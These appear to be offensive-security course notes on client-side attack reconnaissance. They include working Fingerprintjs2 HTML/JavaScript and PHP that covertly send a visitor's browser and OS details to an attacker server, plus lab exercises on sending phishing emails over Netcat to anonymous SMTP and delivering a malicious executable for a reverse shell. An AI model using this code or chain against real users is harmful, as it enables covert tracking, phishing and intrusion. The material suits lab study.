# Passive Client Information Gathering
In passive information gathering, we do not directly interact with our targets. One example can be done by Googling known external corporate IP addresses which can reveal the underlying OS, browser type and version, and other useful information.

We can then use this information in a lab setting to test our exploit, before attempting against the target.


# Active Client Information Gathering
This involves making direct contact with the target or its users, such as through placing a phone call or sending an email in an attempt to extract useful information.


# Client Fingerprinting
Client fingerprinting is extremely crucial to a successful attack as we gather key information from the target machine, from which we can formulate our exploit.

Assuming that we have convinced our victim to cisit our malicious web page, our goal would be to identify the victim's web browser version and information about the target's underlying OS.

There are many open-source fingerprinting projects, and the most reliable ones are generally those that leverage common client-side components such as **JavaScript**.

One example would be the use of the *Fingerprintjs2* JavaScript library, which canbe installed by downloading and extracting the project from GitHub.
```bash
cd /var/www/html
#sudo wget https://github.com/Valve/fingerprintjs2/archive/master.zip
#sudo unzip master.zip
#sudo mv fingerprintjs2-master/ fingerprint
sudo wget https://github.com/fingerprintjs/fingerprintjs/archive/refs/tags/2.1.0.zip
sudo unzip 2.1.0.zip
sudo mv fingerprintjs-2.1.0/ fingerprint
```

This library can be incorporated into a HTML file based on the examples. We include the library into the **index.html** file licated in the `/var/www/html/fp` directory of the Kali web server.
```bash
kali@kali:/var/www/html/fp$ cat index.html 
<!doctype html>
<html>
<head>
  <title>Fingerprintjs2 test</title>
</head>
<body>
  <h1>Fingerprintjs2</h1>

  <p>Your browser fingerprint: <strong id="fp"></strong></p>
  <p><code id="time"/></p>
  <p><span id="details"/></p>
  <script src="fingerprint2.js"></script>
  <script>
      var d1 = new Date();
      var options = {};
      Fingerprint2.get(options, function (components) {
        var values = components.map(function (component) { return component.value })
        var murmur = Fingerprint2.x64hash128(values.join(''), 31)
        var d2 = new Date();
        var timeString = "Time to calculate the fingerprint: " + (d2 - d1) + "ms";
        var details = "<strong>Detailed information: </strong><br />";
        if(typeof window.console !== "undefined") {
          for (var index in components) {
            var obj = components[index];
            var value = obj.value;
	          if (value !== null) {
              var line = obj.key + " = " + value.toString().substr(0, 150);
              details += line + "<br />";
	          }
          }
        }
        document.querySelector("#details").innerHTML = details 
        document.querySelector("#fp").textContent = murmur 
        document.querySelector("#time").textContent = timeString
      });
  </script>
</body>
</html>
```

When the web page is visited, it invokes the Javascript library, returning the browser User Agent string. This string can be passed to an online user agent database to identify the browser version and operating system.

While this information is what we want, in application, this will display the information to the victim instead of the attacker, so we need a way to transfer this information to our attacking web server.

We do this with a few lines of Ajax code - the modified version of the web page is here:
```html
<!doctype html>
<html>
<head>
  <title>Blank Page</title>
</head>
<body>
  <h1>You have been given the finger!</h1>
  <script src="fingerprint2.js"></script>
  <script>
      var d1 = new Date();
      var options = {};
      Fingerprint2.get(options, function (components) {
        var values = components.map(function (component) { return component.value })
        var murmur = Fingerprint2.x64hash128(values.join(''), 31)
	      var clientfp = "Client browser fingerprint: " + murmur + "\n\n";
        var d2 = new Date();
        var timeString = "Time to calculate fingerprint: " + (d2 - d1) + "ms\n\n";
        var details = "Detailed information: \n";
        if(typeof window.console !== "undefined") {
          for (var index in components) {
            var obj = components[index];
            var value = obj.value;
	          if (value !== null) {
              var line = obj.key + " = " + value.toString().substr(0, 150);
              details += line + "\n";
	          }
          }
        }
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.open("POST", "/fingerprint/js.php");
        xmlhttp.setRequestHeader("Content-Type", "application/txt");
        xmlhttp.send(clientfp + timeString + details);
      });
  </script>
</body>
</html>
```
The output string is sent to **js.php** via a POST request. And the PHP code that processes the POST request is as follows:
```php
# Need to create this file in the /var/www/html/fingerprint directory
<?php
$data = "Client IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
$data .= file_get_contents('php://input');
$data .= "---------------------------------\n\n";
file_put_contents('/var/www/html/fingerprint/fingerprint.txt', print_r($data, true), FILE_APPEND | LOCK_EX);
?>
```
Since we are using the FILE_APPEND flag, this allows us to store multiple fingerprints to the same file. In order for this to work, we need to allow the Apache *www-data* user to write to the fp directory.
```bash
sudo chown www-data:www-data fp
```

```bash
sudo systemctl start apache2
```

This modification makes sure that no information is displayed on the victim's browser, but only the text that we choose. The information extracted is then sent to our attack server for storage.

# Topical Exercises
4.  On the target VM #1 enumerate the victim's company website and identify the person working in HR. The objective of this challenge is to mount a social engineering attack against HR. The victim machine is running an SMTP server that can be used to send company emails. The SMTP server allows anonymous logins. Research how to interact with the SMTP server using Netcat. Then, send a phishing email to the HR employee that contains keywords "job application". Include a link to the attacker's web server in the email body. Once the victim clicks on the malicious link, capture the browser's user-agent string. The flag is contained within the user-agent string.

5.  On the target VM #2 enumerate the victim's company website and identify employees working in IT and Sales departments. The objective of this challenge is to mount a social engineering attack against the person in sales. The victim machine is running an SMTP server that can be used to send company emails. The SMTP server allows anonymous logins. Research how to interact with the SMTP server using Netcat. Then, send a phishing email from the IT person to the employee in sales that contains keywords "urgent" and "patch". Create and host a Windows PE payload (_.exe_ executable) and include a link to it in the email body. If your email is sent as instructed, the victim user will open it, click on the link, download the malicious executable, and run it. Once you have obtained a reverse shell, retrieve the flag located on the Administrator user's desktop.
